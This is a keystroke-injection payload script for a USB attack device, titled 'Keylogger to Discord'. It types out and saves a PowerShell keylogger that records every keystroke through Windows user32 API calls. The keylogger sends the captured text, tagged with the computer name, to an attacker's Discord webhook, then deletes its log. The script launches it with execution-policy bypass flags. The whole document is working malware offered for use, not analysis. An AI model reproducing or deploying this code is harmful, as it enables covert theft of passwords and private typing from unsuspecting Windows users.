// =============================================================================
// Title: Keylogger to Discord
// Author: @beigeworm | https://github.com/beigeworm
// Description: Uses Powershell to gather keystroke info and send it via Discord.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// *SETUP*
// replace WEBHOOK_HERE with your discord webhook.
// set $runtime=1 to desired interval beetween emails (in minutes). Default is 1 minute.

// =============================================================================

// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
press("GUI r");
delay(1000);
type("notepad");
delay(200);
press("ENTER");
delay(3000);

// write main Powershell code in notepad
type("Do{$whuri = \"WEBHOOK_HERE\" ;$RunTime = 1;$TimesRun = 1;$getT = Get-Date");
press("ENTER");
delay(200);
type(";$end = $strt.addminutes($RunTime);function Start-Key($Path=\"$env:temp\\log.txt\"){$sigs = @'");
press("ENTER");
delay(200);
type("[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);");
press("ENTER");
delay(200);
type("[DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int GetKeyboardState(byte[] keystate);");
press("ENTER");
delay(200);
type("[DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int MapVirtualKey(uint uCode, int uMapType);");
press("ENTER");
delay(200);
type("[DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);");
press("ENTER");
delay(200);
type("'@");
press("ENTER");
delay(200);
type("$API = Add-Type -MemberDefinition $sigs -Name 'Win32' -Namespace API -PassThru;$null = New-Item -Path $Path -ItemType File -Force;try{$rnnr = 0;while ($TimesRun  -ge $rnnr){");
press("ENTER");
delay(200);
type("while ($end -ge $getT){Start-Sleep -Milliseconds 30;for($ascii = 9; $ascii -le 254; $ascii++){$state = $API::GetAsyncKeyState($ascii);if($state -eq -32767){$null = [console]::CapsLock");
press("ENTER");
delay(200);
type("$virtualKey = $API::MapVirtualKey($ascii, 3);$kbstate = New-Object Byte[] 256;$checkkbstate = $API::GetKeyboardState($kbstate);$mychar = New-Object -TypeName System.Text.StringBuilder");
press("ENTER");
delay(200);
type("$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0);if($success){[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)}}}");
press("ENTER");
delay(200);
type("$getT = Get-Date};$msg = Get-Content -Path $Path -Raw; $escmsg = $msg -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}");
press("ENTER");
delay(200);
type("$json = @{\"username\" = \"$env:COMPUTERNAME\"");
press("ENTER");
delay(200);
type("\"content\" = $escmsg} | ConvertTo-Json");
press("ENTER");
delay(200);
type("Start-Sleep 1; Invoke-RestMethod -Uri $whuri -Method Post -ContentType \"application/json\" -Body $json; Start-Sleep 1; $whuri = \".\"");
press("ENTER");
delay(200);
type("Remove-Item -Path $Path -force}}finally{}}Start-Key}While ($a -le 5)");
press("ENTER");
delay(200);
press("CONTROL SHIFT s");
delay(1000);
type("%temp%");
delay(200);
press("ENTER");
delay(200);
type("txtlog.ps1");
press("TAB");
press("DOWN");
press("DOWN");
press("ENTER");
delay(200);
press("ENTER");
delay(500);
press("ALT F4");
delay(1000);

// start Powershell script
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass -C $env:temp;sleep 1;Start txtlog.ps1;sleep 1;exit");
delay(200);
press("ENTER");
delay(3000);
press("ALT y");